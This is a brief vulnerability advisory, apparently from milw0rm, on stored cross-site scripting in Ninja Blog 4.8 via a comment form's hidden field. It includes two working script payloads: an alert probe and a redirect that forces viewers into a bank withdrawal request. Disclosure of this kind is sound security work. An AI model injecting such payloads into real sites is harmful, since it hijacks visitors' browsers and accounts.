@@ -1,0 +1,24 @@
+Vendor: http://ninjadesigns.co.uk
+Version(s): Ninja Blog 4.8 (May also affect earlier versions)
+Credit: Danny Moules
+Critical: Yes
+
+See PUSH 55 Advisory at https://www.push55.co.uk/index.php?s=ad&id=7
+
+----
+
+Due to insufficient validation of client-side data, we can inject script directly into the file-based storage used for blog comments.
+
+When making a new comment, we simply fill the "posted" hidden field's value with...
+
+<script>alert('xss');<script>"
+
+...for an XSS attack OR...
+
+<script>window.location="http://bank.example/withdraw?account=bob&amount=1000000&for=mallory"</script>
+
+...for a CRSF attack and otherwise submit the comment as usual.
+
+Whenever that comment is viewed, the script is executed.
+
+# milw0rm.com [2009-01-19]
